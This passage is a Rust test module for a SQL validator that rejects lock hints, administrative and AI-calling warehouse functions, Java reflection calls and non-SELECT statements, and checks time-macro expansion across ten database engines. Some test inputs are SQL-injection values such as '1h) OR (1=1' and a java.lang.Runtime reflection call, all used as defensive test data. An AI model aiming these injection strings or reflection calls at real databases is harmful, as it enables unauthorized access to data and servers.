        accepted("SELECT a FROM t WITH (READUNCOMMITTED) JOIN u WITH (NOLOCK) ON t.id = u.id", Engine::MsSql);
        for sql in [
            "SELECT a FROM t WITH (TABLOCKX)",
            "SELECT a FROM t WITH (HOLDLOCK)",
            "SELECT a FROM t WITH (UPDLOCK, ROWLOCK)",
            "SELECT a FROM t WITH (NOLOCK, XLOCK)",
            "SELECT a FROM t JOIN u WITH (PAGLOCK) ON t.id = u.id",
            "WITH c AS (SELECT 1 AS a) SELECT a FROM c WITH (TABLOCK)",
            "SELECT a FROM t (TABLOCKX)",
            "SELECT a FROM t OPTION (TABLE HINT (t, TABLOCKX))",
        ] {
            rejected(sql, Engine::MsSql);
        }
        // A table-valued function's arguments are not hints.
        accepted("SELECT * FROM sys.dm_exec_sql_text(0x01)", Engine::MsSql);
        // Query hints and the old hint form after an alias, also with a comment in between.
        for sql in [
            "SELECT a FROM t OPTION/**/(TABLE HINT (t, TABLOCKX))",
            "SELECT a FROM t option (MAXDOP 1)",
            "SELECT a FROM t x (TABLOCKX)",
            "SELECT a FROM t AS x (HOLDLOCK)",
            "SELECT x.a FROM t x (UPDLOCK) JOIN u ON u.id = x.id",
        ] {
            rejected(sql, Engine::MsSql);
        }
        // OPTION after any kind of table, and hint lists behind other table factors.
        for sql in [
            "SELECT a FROM t CROSS APPLY OPENJSON(t.j) OPTION (TABLE HINT (t, TABLOCKX))",
            "SELECT a FROM t CROSS APPLY OPENJSON(t.j) AS j OPTION (MAXDOP 1)",
            "SELECT a FROM t WHERE a = 1 OPTION (TABLE HINT (t, TABLOCKX))",
            "SELECT a FROM (SELECT 1 AS a) d (TABLOCKX)",
        ] {
            assert!(!rejected(sql, Engine::MsSql).is_empty(), "{sql}");
        }
        // Harmless hints and forms.
        accepted("SELECT a FROM t WITH (INDEX(ix), NOLOCK)", Engine::MsSql);
        accepted("SELECT a FROM t WITH (INDEX = ix)", Engine::MsSql);
        accepted("SELECT a FROM t WITH (FORCESEEK)", Engine::MsSql);
        accepted("SELECT a FROM t x (NOLOCK)", Engine::MsSql);
        accepted("SELECT [option].a FROM t AS [option]", Engine::MsSql);
        accepted("SELECT a FROM t -- option (x)\n", Engine::MsSql);
        accepted("SELECT a FROM v WITH (NOEXPAND)", Engine::MsSql);
        accepted("SELECT 'option (x)' AS a FROM t", Engine::MsSql);
        accepted("SELECT a FROM (VALUES (1)) AS v (a)", Engine::MsSql);
    }

    #[test]
    fn names_that_look_like_forbidden_functions_are_fine_as_tables() {
        for engine in ALL {
            for sql in [
                "SELECT * FROM lo_kunden",
                "SELECT * FROM pg_create_jobs",
                "SELECT * FROM dblinks",
                "SELECT * FROM edit",
            ] {
                accepted(sql, engine);
            }
        }
        accepted("SELECT * FROM pg_replication_origin_status", Engine::Postgres);
        // The PostgreSQL prefix families are PostgreSQL's only.
        accepted("SELECT lo_mein(1)", Engine::MySql);
        rejected("SELECT lo_mein(1)", Engine::Postgres);
    }

    #[test]
    fn identifier_formatting_can_be_limited_to_checked_variables() {
        let vars = BTreeMap::from([("spalte".to_string(), json!("land")), ("frei".to_string(), json!("land"))]);
        let allowed_names: BTreeSet<String> = ["land".to_string()].into();
        let checked: BTreeSet<String> = ["spalte".to_string()].into();
        let mut c = ctx(&vars);
        c.identifiers = Some(&allowed_names);
        c.identifier_variables = Some(&checked);
        assert!(prepare("SELECT ${spalte:identifier} FROM t", Engine::Postgres, &c).is_ok());
        let e = prepare("SELECT ${frei:identifier} FROM t", Engine::Postgres, &c).unwrap_err();
        assert!(e.message.contains("cannot be an identifier"), "{e}");
        // As a plain value the same variable is fine.
        assert!(prepare("SELECT 1 FROM t WHERE a = $frei", Engine::Postgres, &c).is_ok());
    }

    #[test]
    fn warehouses_bind_times_and_refuse_their_own_escapes() {
        let reason = |sql: &str, engine: Engine| {
            let vars = BTreeMap::new();
            prepare(sql, engine, &ctx(&vars)).unwrap_err().reason
        };
        let p = accepted("SELECT * FROM t WHERE $__timeFilter(ts) AND n = $__interval", Engine::BigQuery);
        assert_eq!(
            p.sql,
            "SELECT * FROM t WHERE (ts BETWEEN TIMESTAMP_MILLIS(?) AND TIMESTAMP_MILLIS(?)) AND n = INTERVAL ? MILLISECOND"
        );
        let p = accepted("SELECT * FROM t WHERE land = $land AND id IN ($ids)", Engine::Databricks);
        assert_eq!(p.sql, "SELECT * FROM t WHERE land = :p1 AND id IN (:p2, :p3, :p4)");
        let p = accepted("SELECT * FROM t WHERE ts > $__timeFrom", Engine::Snowflake);
        assert_eq!(p.sql, "SELECT * FROM t WHERE ts > TO_TIMESTAMP_TZ(?, 3)");
        assert_eq!(interval_words(30_000), "30 seconds");
        assert_eq!(interval_words(60_000), "1 minute");
        assert_eq!(interval_words(250), "250 milliseconds");
        // Variables in strings, comments and quoted names stay text.
        for (sql, engine) in [
            ("SELECT '''$land''' AS a", Engine::BigQuery),
            ("SELECT \"$land\" AS a", Engine::BigQuery),
            ("SELECT 1 # $land\n", Engine::BigQuery),
            ("SELECT `$land` FROM t", Engine::Databricks),
            ("SELECT \"$land\" AS a", Engine::Databricks),
            ("SELECT 1 /* a /* $land */ b */", Engine::Databricks),
            ("SELECT 1 // $land\n", Engine::Snowflake),
            ("SELECT \"$land\" FROM t", Engine::Snowflake),
        ] {
            assert!(accepted(sql, engine).binds.is_empty(), "{engine:?}: {sql}");
        }
        assert_eq!(reason("SELECT r'a\\' FROM t", Engine::BigQuery), "sql.raw_string");
        assert_eq!(reason("SELECT `a\\b` FROM t", Engine::BigQuery), "sql.identifier_backslash");
        assert_eq!(reason("SELECT * FROM t WHERE a = @x", Engine::BigQuery), "sql.placeholder");
        accepted("SELECT @@project_id", Engine::BigQuery);
        accepted("SELECT r'a.b' AS x", Engine::BigQuery);
        assert_eq!(reason("SELECT * FROM @s", Engine::Snowflake), "sql.stage_reference");
        assert_eq!(reason("SELECT 1 # x", Engine::Snowflake), "sql.hash_comment");
        assert_eq!(reason("SELECT SYSTEM$WHITELIST()", Engine::Snowflake), "sql.dollar_in_name");
        assert_eq!(reason("SELECT $1 FROM t", Engine::Snowflake), "sql.dollar_quote");
        assert_eq!(reason("SELECT * FROM json.`/tmp/x`", Engine::Databricks), "sql.path_table");
        assert_eq!(reason("SELECT ai_summarize('x')", Engine::Databricks), "sql.function_not_allowed");
        assert_eq!(reason("SELECT * FROM EXTERNAL_QUERY('c', 'q')", Engine::BigQuery), "sql.function_not_allowed");
        for engine in [Engine::BigQuery, Engine::Snowflake, Engine::Databricks] {
            assert_eq!(reason("SELECT ?", engine), "sql.placeholder", "{engine:?}");
            assert_eq!(reason("UPDATE t SET a = 1", engine), "sql.not_select", "{engine:?}");
        }
        // SYSTEM$ functions in double quotes, where the scanner does not see the `$`.
        for quoted in [
            "SELECT \"SYSTEM$CANCEL_ALL_QUERIES\"(123)",
            "SELECT \"system$abort_session\"(1)",
            "SELECT \"SNOWFLAKE\".\"SYSTEM$WAIT\"(10)",
            "SELECT * FROM TABLE(\"SYSTEM$X\"())",
        ] {
            assert_eq!(reason(quoted, Engine::Snowflake), "sql.function_not_allowed", "{quoted}");
        }
        // Cortex and AI functions call models.
        for call in [
            "SELECT SNOWFLAKE.CORTEX.COMPLETE('m', 'x')",
            "SELECT snowflake.cortex.translate(t, 'de', 'en') FROM t",
            "SELECT SNOWFLAKE.CORTEX.SENTIMENT(t) FROM t",
            "SELECT SNOWFLAKE.CORTEX.EXTRACT_ANSWER(t, 'q') FROM t",
            "SELECT SNOWFLAKE.CORTEX.EMBED_TEXT_768('m', t) FROM t",
            "SELECT \"SNOWFLAKE\".\"CORTEX\".\"SUMMARIZE\"(t) FROM t",
            "SELECT SUMMARIZE(t) FROM t",
            "SELECT AI_COMPLETE('m', 'x')",
            "SELECT AI_CLASSIFY(t, 'a') FROM t",
        ] {
            assert_eq!(reason(call, Engine::Snowflake), "sql.function_not_allowed", "{call}");
        }
        // The ordinary string function TRANSLATE stays.
        accepted("SELECT TRANSLATE(name, 'ä', 'a') FROM t", Engine::Snowflake);
        for call in ["SELECT java_method('java.lang.Runtime', 'getRuntime')", "SELECT reflect('a', 'b')"] {
            assert_eq!(reason(call, Engine::Databricks), "sql.function_not_allowed", "{call}");
        }
        // A table named `json` in a schema is no file path.
        accepted("SELECT * FROM json.events", Engine::Databricks);
    }

    /// Every engine with its own macro expansion, InfluxDB's SQL (DataFusion) included.
    const EVERY_ENGINE: [Engine; 10] = [
        Engine::Postgres,
        Engine::MySql,
        Engine::Sqlite,
        Engine::MsSql,
        Engine::ClickHouse,
        Engine::DataFusion,
        Engine::Oracle,
        Engine::BigQuery,
        Engine::Snowflake,
        Engine::Databricks,
    ];

    fn with_vars(sql: &str, engine: Engine, vars: &BTreeMap<String, Value>) -> Result<Prepared, Rejected> {
        prepare(sql, engine, &ctx(vars))
    }

    #[test]
    fn time_macros_pass_the_check_in_every_engine() {
        let vars = BTreeMap::from([("bucket".to_string(), json!("6h")), ("auto".to_string(), json!("auto"))]);
        for engine in EVERY_ENGINE {
            for sql in [
                "SELECT $__time(ts), v FROM m",
                "SELECT $__timeEpoch(ts), v FROM m",
                "SELECT $__timeGroup(ts, 1h) AS t, count(*) FROM m GROUP BY 1",
                "SELECT $__timeGroupAlias(ts, '5m'), count(*) FROM m WHERE $__timeFilter(ts) GROUP BY 1 ORDER BY 1",
                "SELECT $__timeGroupAlias(ts, $__interval, NULL), count(*) FROM m GROUP BY 1",
                "SELECT $__timeGroupAlias(ts, $bucket, previous), count(*) FROM m GROUP BY 1",
                "SELECT $__timeGroupAlias(ts, ${auto}, 0), count(*) FROM m GROUP BY 1",
                "SELECT u FROM m WHERE $__unixEpochFilter(u)",
                "SELECT n FROM m WHERE $__unixEpochNanoFilter(n)",
                "SELECT u FROM m WHERE u >= $__unixEpochFrom() AND u <= $__unixEpochTo",
                "SELECT n FROM m WHERE n >= $__unixEpochNanoFrom() AND n <= $__unixEpochNanoTo()",
                "SELECT $__unixEpochGroup(u, 1d) AS t, count(*) FROM m GROUP BY 1",
                "SELECT $__unixEpochGroupAlias(u, 30m), count(*) FROM m GROUP BY 1",
            ] {
                with_vars(sql, engine, &vars).unwrap_or_else(|e| panic!("{engine:?} rejected {sql}: {e}"));
            }
        }
    }

    #[test]
    fn time_columns_and_groups_per_engine() {
        let expect = |engine: Engine, sql: &str, want: &str| {
            assert_eq!(accepted(sql, engine).sql, want, "{engine:?}: {sql}");
        };
        let p = Engine::Postgres;
        expect(p, "SELECT $__time(ts) FROM m", "SELECT ts AS \"time\" FROM m");
        expect(p, "SELECT $__timeEpoch(ts) FROM m", "SELECT extract(epoch from ts) AS \"time\" FROM m");
        expect(
            p,
            "SELECT $__timeGroupAlias(ts, 1h) FROM m GROUP BY 1",
            "SELECT to_timestamp(floor(extract(epoch from ts) / 3600) * 3600) AS \"time\" FROM m GROUP BY 1",
        );
        expect(p, "SELECT $__unixEpochGroup(u, '5m') FROM m", "SELECT FLOOR(u / 300) * 300 FROM m");
        expect(Engine::MySql, "SELECT $__time(ts) FROM m", "SELECT ts AS `time` FROM m");
        expect(
            Engine::MySql,
            "SELECT $__timeGroup(ts, 1d) FROM m",
            "SELECT FROM_UNIXTIME(FLOOR(UNIX_TIMESTAMP(ts) / 86400) * 86400) FROM m",
        );
        expect(
            Engine::MsSql,
            "SELECT $__timeEpoch(ts) FROM m",
            "SELECT DATEDIFF_BIG(second, '1970-01-01', ts) AS [time] FROM m",
        );
        expect(
            Engine::MsSql,
            "SELECT $__timeGroup(ts, 1h) FROM m",
            "SELECT DATEADD(second, CAST(CAST(FLOOR(CAST(DATEDIFF_BIG(second, '1970-01-01', ts) AS float) / 3600) * 3600 \
             AS bigint) % 86400 AS int), DATEADD(day, CAST(CAST(FLOOR(CAST(DATEDIFF_BIG(second, '1970-01-01', ts) \
             AS float) / 3600) * 3600 AS bigint) / 86400 AS int), CAST('1970-01-01' AS datetime2))) FROM m",
        );
        expect(
            Engine::ClickHouse,
            "SELECT $__timeGroupAlias(ts, 1m) FROM m",
            "SELECT toDateTime(intDiv(toUnixTimestamp(ts), 60) * 60, 'UTC') AS `time` FROM m",
        );
        expect(Engine::ClickHouse, "SELECT $__unixEpochGroup(u, 1m) FROM m", "SELECT intDiv(u, 60) * 60 FROM m");
        expect(
            Engine::DataFusion,
            "SELECT $__timeGroup(time, 1m) FROM m",
            "SELECT date_bin(INTERVAL '60 seconds', time, TIMESTAMP '1970-01-01T00:00:00Z') FROM m",
        );
        expect(
            Engine::Oracle,
            "SELECT $__timeEpoch(ts) FROM m",
            "SELECT ROUND((CAST(ts AS DATE) - DATE '1970-01-01') * 86400) AS \"time\" FROM m",
        );
        expect(
            Engine::BigQuery,
            "SELECT $__timeGroup(ts, 1h) FROM m",
            "SELECT TIMESTAMP_SECONDS(CAST(FLOOR(UNIX_SECONDS(ts) / 3600) * 3600 AS INT64)) FROM m",
        );
        expect(Engine::Snowflake, "SELECT $__timeGroup(ts, 1h) FROM m", "SELECT TIME_SLICE(ts, 3600, 'SECOND') FROM m");
        expect(
            Engine::Databricks,
            "SELECT $__timeGroupAlias(ts, 1h) FROM m",
            "SELECT timestamp_seconds(floor(unix_timestamp(ts) / 3600) * 3600) AS `time` FROM m",
        );
        let sqlite = accepted("SELECT $__timeGroup(am, 1h) FROM e", Engine::Sqlite).sql;
        assert!(sqlite.starts_with("SELECT datetime(((CASE WHEN typeof(am)"), "{sqlite}");
        assert!(sqlite.ends_with(" % 3600) + 3600) % 3600), 'unixepoch') FROM e"), "{sqlite}");
        // Rounded down also before 1970, where SQLite's `/` would round toward zero.
        expect(
            Engine::Sqlite,
            "SELECT $__unixEpochGroup(u, 60) FROM m",
            "SELECT (CAST(u AS INTEGER) - ((CAST(u AS INTEGER) % 60) + 60) % 60) FROM m",
        );
        // Names count only in the engine's own quotes; inside them `--`, `;` and `*/` are text.
        let column = |sql: &str, engine: Engine| {
            let vars = BTreeMap::new();
            prepare(sql, engine, &ctx(&vars)).map(|p| p.sql).map_err(|e| e.reason)
        };
        assert_eq!(
            column("SELECT $__time(\"a -- b; c */ d\") FROM m", Engine::Postgres),
            Ok("SELECT \"a -- b; c */ d\" AS \"time\" FROM m".to_string())
        );
        assert_eq!(
            column("SELECT $__timeGroup([a -- b], 1h) FROM m", Engine::MsSql).map(|s| s.contains("[a -- b]")),
            Ok(true)
        );
        assert_eq!(
            column("SELECT $__time(`a -- b`) FROM m", Engine::MySql),
            Ok("SELECT `a -- b` AS `time` FROM m".into())
        );
        for (sql, engine) in [
            ("SELECT $__time(`a -- b`) FROM m", Engine::Postgres),
            ("SELECT $__time(`a`) FROM m", Engine::Postgres),
            ("SELECT $__time([a]) FROM m", Engine::Postgres),
            ("SELECT $__time(\"a\") FROM m", Engine::MySql),
            ("SELECT $__time(\"a\") FROM m", Engine::BigQuery),
            ("SELECT $__time(`a`) FROM m", Engine::MsSql),
            ("SELECT $__time(`a\\` FROM m", Engine::ClickHouse),
            ("SELECT * FROM m WHERE $__timeFilter(`ts`)", Engine::Postgres),
        ] {
            assert!(column(sql, engine).is_err(), "{engine:?} accepted {sql}");
        }
        // Quoted names stay as written; the same group twice is the same text, so GROUP BY matches.
        let p = accepted("SELECT $__timeGroup(\"Zeit punkt\", 1h) FROM m GROUP BY $__timeGroup(\"Zeit punkt\", 1h)", p);
        assert_eq!(
            p.sql,
            "SELECT to_timestamp(floor(extract(epoch from \"Zeit punkt\") / 3600) * 3600) FROM m \
             GROUP BY to_timestamp(floor(extract(epoch from \"Zeit punkt\") / 3600) * 3600)"
        );
        assert!(p.binds.is_empty(), "intervals are checked numbers in the text, not values");
    }

    #[test]
    fn unix_epoch_filters_bind_seconds_and_nanoseconds() {
        // The test range is 1,000 ms to 61,000 ms.
        let p = accepted("SELECT * FROM m WHERE $__unixEpochFilter(u)", Engine::Postgres);
        assert_eq!(p.sql, "SELECT * FROM m WHERE (u >= $1 AND u <= $2)");
        assert_eq!(p.binds, [Bind::Int(1), Bind::Int(61)]);
        let p = accepted("SELECT * FROM m WHERE $__unixEpochNanoFilter(n)", Engine::MySql);
        assert_eq!(p.sql, "SELECT * FROM m WHERE (n >= ? AND n <= ?)");
        assert_eq!(p.binds, [Bind::Int(1_000_000_000), Bind::Int(61_000_000_000)]);
        let p = accepted("SELECT $__unixEpochFrom(), $__unixEpochTo, $__unixEpochNanoFrom()", Engine::MsSql);
        assert_eq!(p.sql, "SELECT @P1, @P2, @P3");
        assert_eq!(p.binds, [Bind::Int(1), Bind::Int(61), Bind::Int(1_000_000_000)]);
        let p = accepted("SELECT * FROM m WHERE $__unixEpochFilter(u)", Engine::ClickHouse);
        assert_eq!(p.sql, "SELECT * FROM m WHERE (u >= {p1:Int64} AND u <= {p2:Int64})");
    }

    #[test]
    fn group_intervals_are_checked_durations() {
        let vars = BTreeMap::from([
            ("bucket".to_string(), json!("6h")),
            ("schlecht".to_string(), json!("1h) OR (1=1")),
            ("liste".to_string(), json!(["1h", "2h"])),
            ("zahl".to_string(), json!(120)),
        ]);
        let group =
            |interval: &str| with_vars(&format!("SELECT $__timeGroup(ts, {interval}) FROM m"), Engine::Postgres, &vars);
        let seconds = |interval: &str| {
            let p = group(interval).unwrap_or_else(|e| panic!("{interval}: {e}"));
            p.sql.split(" / ").nth(1).and_then(|r| r.split(')').next()).unwrap().to_string()
        };
        assert_eq!(seconds("1h"), "3600");
        assert_eq!(seconds("'15m'"), "900");
        assert_eq!(seconds("90"), "90");
        assert_eq!(seconds("1w"), "604800");
        assert_eq!(seconds("250ms"), "1", "at least a second");
        assert_eq!(seconds("$__interval"), "30");
        assert_eq!(seconds("$bucket"), "21600");
        assert_eq!(seconds("${bucket}"), "21600");
        assert_eq!(seconds("$zahl"), "120");
        for bad in ["1 hour", "1M", "0s", "-1h", "1h OR 1=1", "(1)", "now()", "11y", "$__interval_ms", "''"] {
            let e = group(bad).unwrap_err();
            assert_eq!(e.reason, "sql.macro_interval", "{bad}: {e}");
        }
        for bad_value in ["$schlecht", "$liste"] {
            let e = group(bad_value).unwrap_err();
            assert_eq!(e.reason, "sql.macro_interval_variable", "{bad_value}: {e}");
        }
        assert_eq!(group("$fehlt").unwrap_err().reason, "sql.variable_missing");
    }

    #[test]
    fn group_fills_and_wrong_calls() {
        let reason = |sql: &str| {
            let vars = BTreeMap::new();
            prepare(sql, Engine::Postgres, &ctx(&vars)).unwrap_err().reason
        };
        let fill = |sql: &str| accepted(sql, Engine::Postgres).fill;
        let at = |mode| Some(Fill { step_ms: 3_600_000, mode, from: 1_000, to: 61_000 });
        assert_eq!(fill("SELECT $__timeGroup(ts, 1h) FROM m"), None);
        assert_eq!(fill("SELECT $__timeGroup(ts, 1h, NULL) FROM m"), at(FillMode::Null));
        assert_eq!(fill("SELECT $__timeGroupAlias(ts, 1h, previous) FROM m"), at(FillMode::Previous));
        assert_eq!(fill("SELECT $__timeGroupAlias(ts, 1h, -2.5) FROM m"), at(FillMode::Value(-2.5)));
        assert_eq!(reason("SELECT $__timeGroup(ts, 1h, 'x') FROM m"), "sql.macro_fill");
        assert_eq!(reason("SELECT $__timeGroup(ts, 1h, 1e9) FROM m"), "sql.macro_fill");
        assert_eq!(reason("SELECT $__timeGroup(ts) FROM m"), "sql.macro_arguments");
        assert_eq!(reason("SELECT $__timeGroup FROM m"), "sql.macro_arguments");
        assert_eq!(reason("SELECT $__time(a, b) FROM m"), "sql.macro_arguments");
        assert_eq!(reason("SELECT $__unixEpochGroup(u, 1h, 0) FROM m"), "sql.macro_arguments");
        assert_eq!(reason("SELECT $__timeGroup(ts, 1h FROM m"), "sql.unclosed_macro");
        assert_eq!(reason("SELECT $__time(ts OR 1=1) FROM m"), "sql.macro_column");
        assert_eq!(reason("SELECT $__timeGroup(now(), 1h) FROM m"), "sql.macro_column");
        assert_eq!(reason("SELECT $__unixEpochFilter('x') FROM m"), "sql.macro_column");
        // A comma inside a quoted name does not split the arguments.
        let p = accepted("SELECT $__time(\"a,b\") FROM m", Engine::Postgres);
        assert_eq!(p.sql, "SELECT \"a,b\" AS \"time\" FROM m");
    }

    #[test]
    fn placeholders_can_be_cast_to_the_type_the_database_expects() {
        let vars = BTreeMap::from([("bucket".to_string(), json!("1h"))]);
        let p = with_vars(
            "SELECT date_bin($bucket::interval, ts, timestamptz '2000-01-01') FROM m WHERE n = $bucket",
            Engine::Postgres,
            &vars,
        )
        .unwrap();
        assert_eq!(p.sql, "SELECT date_bin($1::interval, ts, timestamptz '2000-01-01') FROM m WHERE n = $2");
        let casts = BTreeMap::from([(1, ("text", "interval".to_string()))]);
        assert_eq!(
            p.with_casts(Engine::Postgres, &casts).unwrap(),
            "SELECT date_bin(CAST(CAST($1 AS text) AS interval)::interval, ts, timestamptz '2000-01-01') FROM m \
             WHERE n = $2"
        );
        // A `$1` in a string is text, not a placeholder; only Kalzit's own placeholders change.
        let p = with_vars("SELECT '$1', $bucket::int", Engine::Postgres, &vars).unwrap();
        let casts = BTreeMap::from([(1, ("text", "integer".to_string()))]);
        assert_eq!(
            p.with_casts(Engine::Postgres, &casts).unwrap(),
            "SELECT '$1', CAST(CAST($1 AS text) AS integer)::int"
        );
    }

    #[test]
    fn durations() {
        assert_eq!(duration_ms("30s"), Some(30_000));
        assert_eq!(duration_ms(" '1d' "), Some(86_400_000));
        assert_eq!(duration_ms("1y"), Some(365 * 86_400_000));
        assert_eq!(duration_ms("10y"), Some(MAX_GROUP_MS));
        assert_eq!(duration_ms("999999999999999h"), None);
        assert_eq!(duration_ms("1.5h"), None);
        assert_eq!(duration_ms("h"), None);
    }
}
